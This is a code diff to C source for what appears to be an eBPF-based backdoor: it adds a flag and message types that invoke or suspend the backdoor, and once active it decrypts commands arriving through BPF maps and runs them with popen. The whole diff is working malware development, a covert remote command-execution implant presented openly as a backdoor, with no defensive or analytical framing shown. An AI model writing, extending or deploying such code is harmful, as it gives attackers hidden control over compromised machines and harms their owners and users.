@@ -1,5 +1,7 @@
 #include "nyako.h"
 
+static bool active = false;
+
 static int get_map_value(int fd, __u32 key, struct message_details *value)
 {
   if ((bpf_map_lookup_elem(fd, &key, value)) != 0)
@@ -42,19 +44,26 @@ static void handle_message(struct message_details *message_details)
   // skip if no data
   if (strlen((const char *)message_details->message) == 0)
   {
-    printf("empty message, skipping...\n");
+    // printf("empty message, skipping...\n");
     return;
   }
 
   parse_message(message_details->message, &message);
-  if (decrypt(command, message.ciphertext, message.ciphertext_len, message.nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH) < 0)
+
+  // do not handle message if the backdoor is not active
+  if (active != true && message.type != TYPE_INVOKE_BACKDOOR)
   {
-    log_error("decrypt");
     return;
   }
 
   if (message.type == TYPE_EXECUTE_CMD)
   {
+    if (decrypt(command, message.ciphertext, message.ciphertext_len, message.nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH) < 0)
+    {
+      log_error("decrypt");
+      return;
+    }
+
     // execute the command
     cmd = popen((char *)command, "r");
     if (cmd == NULL)
@@ -99,6 +108,16 @@ static void handle_message(struct message_details *message_details)
     }
 
     pclose(cmd);
+  }
+  else if (message.type == TYPE_INVOKE_BACKDOOR)
+  {
+    active = true;
+    log_info("backdoor invoked");
+  }
+  else if (message.type == TYPE_SUSPEND_BACKDOOR)
+  {
+    active = false;
+    log_info("backdoor suspended");
   }
   else
   {
